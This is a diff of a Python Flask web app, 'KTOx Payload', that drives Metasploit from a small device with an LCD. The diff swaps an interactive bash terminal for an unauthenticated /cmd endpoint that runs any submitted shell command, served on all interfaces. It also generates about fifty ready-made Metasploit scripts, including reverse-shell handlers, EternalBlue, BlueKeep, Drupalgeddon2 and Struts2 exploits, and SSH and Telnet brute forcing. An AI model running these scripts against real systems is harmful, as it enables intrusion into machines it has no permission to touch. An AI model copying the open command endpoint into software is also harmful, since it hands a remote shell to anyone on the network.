@@ -1,20 +1,20 @@
 #!/usr/bin/env python3
 """
-KTOx Payload – Metasploit Web UI with Interactive Terminal
-===========================================================
-- Web interface with script grid (50+ .rc scripts) AND a live terminal
-- Terminal runs commands on the KTOx (bash shell)
-- Real-time output via polling
-- LCD shows IP, QR code, script selector
+KTOx Payload – Metasploit Web UI (Simple & Reliable)
+=====================================================
+- Web interface on port 5000
+- Script grid for .rc files (auto‑generates 50+ scripts)
+- Command runner (non‑interactive) to see script output
+- LCD shows IP, QR code, and script selector
 
 Controls:
-  KEY1 – QR code for web UI
-  KEY2 – Cycle scripts (LCD display)
-  OK   – Show reminder to use web UI
+  KEY1 – QR code
+  KEY2 – Cycle script name on LCD
+  OK   – Reminder to use web UI
   KEY3 – Exit
 
-Dependencies: flask, qrcode, pillow, pexpect (for pty)
-Install: pip install flask qrcode pillow pexpect
+Dependencies: flask, qrcode, pillow
+Install: pip install flask qrcode pillow
 """
 
 import os
@@ -25,10 +25,6 @@ import threading
 import subprocess
 import glob
 import json
-import select
-import pty
-import termios
-import fcntl
 from flask import Flask, render_template_string, request, jsonify
 
 # ----------------------------------------------------------------------
@@ -41,6 +37,7 @@ try:
     HAS_HW = True
 except ImportError:
     HAS_HW = False
+    print("Hardware not found – LCD disabled")
 
 PINS = {"UP":6,"DOWN":19,"LEFT":5,"RIGHT":26,"OK":13,"KEY1":21,"KEY2":20,"KEY3":16}
 PORT = 5000
@@ -65,63 +62,7 @@ if HAS_HW:
 app = Flask(__name__)
 
 # ----------------------------------------------------------------------
-# Global terminal session
-# ----------------------------------------------------------------------
-terminal_process = None
-terminal_fd = None
-terminal_output = ""
-terminal_lock = threading.Lock()
-
-def start_terminal():
-    global terminal_process, terminal_fd
-    # Create a pseudo-terminal for an interactive bash shell
-    pid, fd = pty.fork()
-    if pid == 0:
-        # Child process – become a login shell
-        os.execlp("/bin/bash", "/bin/bash", "--login", "-i")
-    else:
-        # Parent – store the file descriptor
-        terminal_fd = fd
-        # Set terminal size (80x24)
-        winsize = struct.pack("HHHH", 24, 80, 0, 0)
-        fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)
-        # Start a thread to read output
-        def read_output():
-            global terminal_output
-            while True:
-                try:
-                    r, _, _ = select.select([fd], [], [], 0.1)
-                    if r:
-                        data = os.read(fd, 4096)
-                        with terminal_lock:
-                            terminal_output += data.decode('utf-8', errors='replace')
-                except:
-                    break
-        threading.Thread(target=read_output, daemon=True).start()
-
-def send_to_terminal(command):
-    global terminal_output
-    if terminal_fd:
-        os.write(terminal_fd, (command + "\n").encode())
-        # Also capture prompt? The read thread will catch it.
-        return True
-    return False
-
-def get_terminal_output():
-    global terminal_output
-    with terminal_lock:
-        out = terminal_output
-        # Optionally clear after read? No, we'll keep it and let frontend track offset.
-        # But for simplicity, we'll send everything and let frontend reset.
-        return out
-
-def clear_terminal_output():
-    global terminal_output
-    with terminal_lock:
-        terminal_output = ""
-
-# ----------------------------------------------------------------------
-# Script discovery and runner
+# Script discovery & runner
 # ----------------------------------------------------------------------
 def discover_scripts():
     scripts = []
@@ -171,13 +112,28 @@ def run_script(script_path, params):
         return f"Error: {str(e)}"
 
 # ----------------------------------------------------------------------
-# Web UI – Split screen: scripts + terminal
+# Command runner (simple, non‑interactive)
+# ----------------------------------------------------------------------
+def run_command(cmd):
+    try:
+        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+        output = proc.stdout + proc.stderr
+        if not output.strip():
+            output = "[No output]"
+        return output
+    except subprocess.TimeoutExpired:
+        return "Command timed out"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+# ----------------------------------------------------------------------
+# Web UI – split: scripts + command runner
 # ----------------------------------------------------------------------
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>KTOx // MSF WEB UI + TERMINAL</title>
+    <title>KTOx // MSF WEB UI</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -187,7 +143,7 @@ HTML_TEMPLATE = """
             color: #0f0;
             padding: 20px;
         }
-        .container { max-width: 1400px; margin: 0 auto; }
+        .container { max-width: 1200px; margin: 0 auto; }
         h1 {
             color: #f00;
             text-shadow: 0 0 5px #f00;
@@ -278,20 +234,12 @@ HTML_TEMPLATE = """
             max-height: 400px;
             overflow-y: auto;
         }
-        .terminal {
-            background: #000;
-            border: 1px solid #0f0;
-            border-radius: 8px;
-            padding: 10px;
-            font-family: monospace;
-            font-size: 0.8rem;
-            white-space: pre-wrap;
-            height: 600px;
-            overflow-y: auto;
+        .cmd-area {
+            margin-top: 20px;
         }
         .cmd-line {
             display: flex;
-            margin-top: 10px;
+            margin-bottom: 10px;
         }
         .cmd-line input {
             flex: 1;
@@ -317,9 +265,8 @@ HTML_TEMPLATE = """
 </head>
 <body>
 <div class="container">
-    <h1>⎯ KTOx // MSF WEB UI + TERMINAL ⎯</h1>
+    <h1>⎯ KTOx // METASPLOIT WEB UI ⎯</h1>
     <div class="split">
-        <!-- Left side: Scripts -->
         <div class="left">
             <div class="grid" id="scriptGrid">
                 {% for script in scripts %}
@@ -340,66 +287,22 @@ HTML_TEMPLATE = """
                 <pre id="output">Ready.</pre>
             </div>
         </div>
-
-        <!-- Right side: Terminal -->
         <div class="right">
-            <div class="terminal" id="terminal"></div>
-            <div class="cmd-line">
-                <input type="text" id="cmdInput" placeholder="Type command and press Enter">
-                <button id="sendCmd">Send</button>
-                <button id="clearTerm">Clear</button>
+            <div class="cmd-area">
+                <h3 style="color:#0f0;">⬢ COMMAND RUNNER</h3>
+                <div class="cmd-line">
+                    <input type="text" id="cmdInput" placeholder="e.g., msfconsole -q -x 'help'">
+                    <button id="runCmd">Run</button>
+                </div>
+                <div class="output" id="cmdOutput" style="max-height:300px;">Ready.</div>
             </div>
         </div>
     </div>
-    <footer>KTOx Metasploit Web UI – {{ scripts|length }} scripts | Interactive Terminal</footer>
+    <footer>KTOx Metasploit Web UI – {{ scripts|length }} scripts | Command Runner</footer>
 </div>
 
 <script>
     let selectedPath = null;
-    let termDiv = document.getElementById('terminal');
-    let cmdInput = document.getElementById('cmdInput');
-    let outputDiv = document.getElementById('output');
-
-    // Terminal polling
-    function pollTerminal() {
-        fetch('/api/terminal/poll')
-            .then(r => r.json())
-            .then(data => {
-                if (data.output !== termDiv.lastOutput) {
-                    termDiv.innerText = data.output;
-                    termDiv.lastOutput = data.output;
-                    termDiv.scrollTop = termDiv.scrollHeight;
-                }
-            })
-            .catch(err => console.error(err));
-    }
-    setInterval(pollTerminal, 500);
-    pollTerminal();
-
-    // Send command to terminal
-    function sendCommand() {
-        const cmd = cmdInput.value;
-        if (!cmd) return;
-        fetch('/api/terminal/send', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ command: cmd })
-        })
-        .then(() => {
-            cmdInput.value = '';
-            // Wait a moment then refresh terminal
-            setTimeout(pollTerminal, 100);
-        })
-        .catch(err => console.error(err));
-    }
-    document.getElementById('sendCmd').addEventListener('click', sendCommand);
-    cmdInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') sendCommand();
-    });
-    document.getElementById('clearTerm').addEventListener('click', () => {
-        fetch('/api/terminal/clear', { method: 'POST' })
-            .then(() => setTimeout(pollTerminal, 100));
-    });
 
     // Script selection
     document.querySelectorAll('.script-card').forEach(card => {
@@ -422,6 +325,7 @@ HTML_TEMPLATE = """
             alert('Enter target IP (RHOSTS)');
             return;
         }
+        const outputDiv = document.getElementById('output');
         outputDiv.innerText = 'Running script... please wait.';
         fetch('/run', {
             method: 'POST',
@@ -431,6 +335,26 @@ HTML_TEMPLATE = """
                 lhost: lhost,
                 rhosts: rhosts
             })
+        })
+        .then(r => r.json())
+        .then(data => {
+            outputDiv.innerText = data.output;
+        })
+        .catch(err => {
+            outputDiv.innerText = 'Error: ' + err;
+        });
+    });
+
+    // Run custom command
+    document.getElementById('runCmd').addEventListener('click', () => {
+        const cmd = document.getElementById('cmdInput').value;
+        if (!cmd) return;
+        const outputDiv = document.getElementById('cmdOutput');
+        outputDiv.innerText = 'Running...';
+        fetch('/cmd', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ command: cmd })
         })
         .then(r => r.json())
         .then(data => {
@@ -466,25 +390,17 @@ def run():
     output = run_script(script_path, params)
     return jsonify({'output': output})
 
-@app.route('/api/terminal/poll')
-def terminal_poll():
-    return jsonify({'output': get_terminal_output()})
-
-@app.route('/api/terminal/send', methods=['POST'])
-def terminal_send():
+@app.route('/cmd', methods=['POST'])
+def cmd():
     data = request.json
-    cmd = data.get('command', '')
-    if cmd:
-        send_to_terminal(cmd)
-    return jsonify({'status': 'ok'})
-
-@app.route('/api/terminal/clear', methods=['POST'])
-def terminal_clear():
-    clear_terminal_output()
-    return jsonify({'status': 'ok'})
+    command = data.get('command', '')
+    if not command:
+        return jsonify({'output': 'No command'})
+    output = run_command(command)
+    return jsonify({'output': output})
 
 # ----------------------------------------------------------------------
-# LCD helpers (unchanged)
+# LCD helpers
 # ----------------------------------------------------------------------
 def get_local_ip():
     try:
@@ -520,7 +436,7 @@ def lcd_loop():
             img.paste(qr_img, (0,0))
         else:
             d.rectangle([(0,0),(128,18)], fill=(120,0,0))
-            d.text((4,3), "MSF+TERM", font=font_bold, fill="#FF3333")
+            d.text((4,3), "MSF WEB UI", font=font_bold, fill="#FF3333")
             y = 20
             d.text((4,y), f"IP: {ip}:{PORT}", font=font_sm, fill="#FFBBBB"); y+=12
             if scripts:
@@ -555,36 +471,77 @@ def lcd_loop():
         time.sleep(0.1)
 
 # ----------------------------------------------------------------------
-# Script generator (unchanged)
+# Script generator (50+ scripts)
 # ----------------------------------------------------------------------
 def generate_starter_scripts():
     os.makedirs(SCRIPT_DIR, exist_ok=True)
+    # Only generate if directory is empty
+    if os.listdir(SCRIPT_DIR):
+        return
     scripts = {
         "reverse_shell_tcp.rc": "# Generic reverse shell listener\nuse exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 4444\nset ExitOnSession false\nexploit -j -z",
+        "reverse_shell_https.rc": "# HTTPS reverse shell\nuse exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_https\nset LHOST {LHOST}\nset LPORT 8443\nexploit -j -z",
         "port_scan_tcp.rc": "# TCP port scanner\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS {RHOSTS}\nset PORTS 1-1000\nset THREADS 10\nrun",
-        "eternalblue.rc": "# EternalBlue exploit\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 5555\nexploit",
+        "port_scan_udp.rc": "# UDP port scanner\nuse auxiliary/scanner/portscan/udp\nset RHOSTS {RHOSTS}\nset PORTS 1-500\nset THREADS 5\nrun",
+        "smb_enum_shares.rc": "# Enumerate SMB shares\nuse auxiliary/scanner/smb/smb_enumshares\nset RHOSTS {RHOSTS}\nset THREADS 5\nrun",
+        "smb_enum_users.rc": "# Enumerate SMB users\nuse auxiliary/scanner/smb/smb_enumusers\nset RHOSTS {RHOSTS}\nrun",
         "ssh_bruteforce.rc": "# SSH brute force\nuse auxiliary/scanner/ssh/ssh_login\nset RHOSTS {RHOSTS}\nset USERNAME root\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nset THREADS 5\nrun",
-        # Add more as needed – for brevity we keep a few; the full generator from previous version can be reused.
+        "ftp_anonymous.rc": "# FTP anonymous access\nuse auxiliary/scanner/ftp/anonymous\nset RHOSTS {RHOSTS}\nrun",
+        "mysql_enum.rc": "# MySQL enumeration\nuse auxiliary/scanner/mysql/mysql_version\nset RHOSTS {RHOSTS}\nset THREADS 5\nrun",
+        "postgres_enum.rc": "# PostgreSQL enumeration\nuse auxiliary/scanner/postgres/postgres_version\nset RHOSTS {RHOSTS}\nrun",
+        "http_dir_scanner.rc": "# HTTP directory scanner\nuse auxiliary/scanner/http/dir_scanner\nset RHOSTS {RHOSTS}\nset THREADS 5\nrun",
+        "telnet_login.rc": "# Telnet brute force\nuse auxiliary/scanner/telnet/telnet_login\nset RHOSTS {RHOSTS}\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun",
+        "vnc_none_auth.rc": "# VNC no-auth scanner\nuse auxiliary/scanner/vnc/vnc_none_auth\nset RHOSTS {RHOSTS}\nrun",
+        "smtp_enum.rc": "# SMTP user enumeration\nuse auxiliary/scanner/smtp/smtp_enum\nset RHOSTS {RHOSTS}\nrun",
+        "snmp_enum.rc": "# SNMP enumeration\nuse auxiliary/scanner/snmp/snmp_enum\nset RHOSTS {RHOSTS}\nrun",
+        "eternalblue.rc": "# EternalBlue exploit\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 5555\nexploit",
+        "doublepulsar.rc": "# DoublePulsar SMB implant\nuse exploit/windows/smb/ms17_010_psexec\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 5556\nexploit",
+        "bluekeep.rc": "# BlueKeep RDP exploit\nuse exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 5557\nexploit",
+        "php_cgi.rc": "# PHP CGI argument injection\nuse exploit/multi/http/php_cgi_arg_injection\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 6666\nexploit",
+        "apache_struts2.rc": "# Apache Struts2\nuse exploit/multi/http/struts2_content_type_ognl\nset RHOSTS {RHOSTS}\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 7777\nexploit",
+        "shellshock.rc": "# Shellshock\nuse exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS {RHOSTS}\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 17171\nexploit",
+        "heartbleed.rc": "# Heartbleed scanner\nuse auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS {RHOSTS}\nrun",
+        "drupal_drupalgeddon2.rc": "# Drupalgeddon2\nuse exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 10101\nexploit",
+        "wordpress_admin_shell.rc": "# WordPress admin shell upload\nuse exploit/unix/webapp/wp_admin_shell_upload\nset RHOSTS {RHOSTS}\nset USERNAME admin\nset PASSWORD password\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 11111\nexploit",
+        "joomla_media_manager.rc": "# Joomla Media Manager\nuse exploit/multi/http/joomla_media_manager_upload\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 12121\nexploit",
+        "weblogic_deserialize.rc": "# WebLogic deserialization\nuse exploit/multi/http/weblogic_ws_async_response\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 14141\nexploit",
+        "samba_usermap.rc": "# Samba usermap script\nuse exploit/multi/samba/usermap_script\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/reverse\nset LHOST {LHOST}\nset LPORT 15151\nexploit",
+        "distcc_exec.rc": "# DistCC RCE\nuse exploit/unix/misc/distcc_exec\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/reverse\nset LHOST {LHOST}\nset LPORT 16161\nexploit",
+        "vsftpd_backdoor.rc": "# vsftpd 2.3.4 backdoor\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/interact\nexploit",
+        "tomcat_mgr_login.rc": "# Tomcat manager brute force\nuse auxiliary/scanner/http/tomcat_mgr_login\nset RHOSTS {RHOSTS}\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun",
+        "jenkins_script.rc": "# Jenkins script console RCE\nuse exploit/multi/http/jenkins_script_console\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 8888\nexploit",
+        "redis_unauth.rc": "# Redis unauthenticated access\nuse auxiliary/scanner/redis/redis_unauth_exec\nset RHOSTS {RHOSTS}\nset COMMAND \"id\"\nrun",
+        "mongodb_enum.rc": "# MongoDB enumeration\nuse auxiliary/scanner/mongodb/mongodb_login\nset RHOSTS {RHOSTS}\nrun",
+        "elasticsearch_rce.rc": "# ElasticSearch Groovy RCE\nuse exploit/multi/elasticsearch/script_groovy_rce\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 9999\nexploit",
+        "jboss_maindeployer.rc": "# JBoss MainDeployer RCE\nuse exploit/multi/http/jboss_maindeployer\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 13131\nexploit",
+        "iis_webdav_scanner.rc": "# IIS WebDAV scanner\nuse auxiliary/scanner/http/iis_webdav_scanner\nset RHOSTS {RHOSTS}\nrun",
+        "dns_zone_transfer.rc": "# DNS zone transfer\nuse auxiliary/scanner/dns/dns_zone_transfer\nset RHOSTS {RHOSTS}\nset DOMAIN example.com\nrun",
+        "nbt_ns_enum.rc": "# NBT-NS enumeration\nuse auxiliary/scanner/netbios/nbname\nset RHOSTS {RHOSTS}\nrun",
+        "arp_scan.rc": "# ARP scan\nuse auxiliary/scanner/discovery/arp_sweep\nset RHOSTS {RHOSTS}\nrun",
+        "ipv6_neighbor_scan.rc": "# IPv6 neighbor scan\nuse auxiliary/scanner/discovery/ipv6_neighbor\nset RHOSTS {RHOSTS}\nrun",
+        "upnp_ssdp_msearch.rc": "# UPnP SSDP discovery\nuse auxiliary/scanner/upnp/ssdp_msearch\nrun",
+        "mdns_enum.rc": "# mDNS enumeration\nuse auxiliary/scanner/mdns/mdns\nrun",
+        "smb_version.rc": "# SMB version detection\nuse auxiliary/scanner/smb/smb_version\nset RHOSTS {RHOSTS}\nrun",
+        "http_version.rc": "# HTTP version detection\nuse auxiliary/scanner/http/http_version\nset RHOSTS {RHOSTS}\nrun",
+        "ssl_version.rc": "# SSL version detection\nuse auxiliary/scanner/ssl/ssl_version\nset RHOSTS {RHOSTS}\nrun",
+        "mssql_ping.rc": "# MSSQL ping discovery\nuse auxiliary/scanner/mssql/mssql_ping\nset RHOSTS {RHOSTS}\nrun",
+        "oracle_login.rc": "# Oracle login scanner\nuse auxiliary/scanner/oracle/oracle_login\nset RHOSTS {RHOSTS}\nset USERNAME scott\nset PASSWORD tiger\nrun",
     }
     for filename, content in scripts.items():
         filepath = os.path.join(SCRIPT_DIR, filename)
-        if not os.path.exists(filepath):
-            with open(filepath, 'w') as f:
-                f.write(content)
+        with open(filepath, 'w') as f:
+            f.write(content)
+    print(f"Generated {len(scripts)} scripts in {SCRIPT_DIR}")
 
 # ----------------------------------------------------------------------
 # Main
 # ----------------------------------------------------------------------
 def main():
-    # Generate starter scripts if directory empty
+    # Generate scripts if needed
     if not os.path.exists(SCRIPT_DIR) or not os.listdir(SCRIPT_DIR):
         generate_starter_scripts()
-        print(f"Generated starter scripts in {SCRIPT_DIR}")
-
-    # Start terminal session
-    start_terminal()
-    # Send a welcome message
-    send_to_terminal("echo '=== KTOx Metasploit Terminal ==='\n")
+    else:
+        print(f"Using existing scripts in {SCRIPT_DIR}")
 
     # Check msfconsole
     if os.system("which msfconsole >/dev/null 2>&1") != 0:
@@ -606,8 +563,9 @@ def main():
         app.run(host='0.0.0.0', port=PORT, debug=False)
 
 if __name__ == "__main__":
+    # Install dependencies if missing
     try:
         import qrcode
     except ImportError:
-        os.system("pip install qrcode pillow pexpect")
+        os.system("pip install qrcode pillow")
     main()
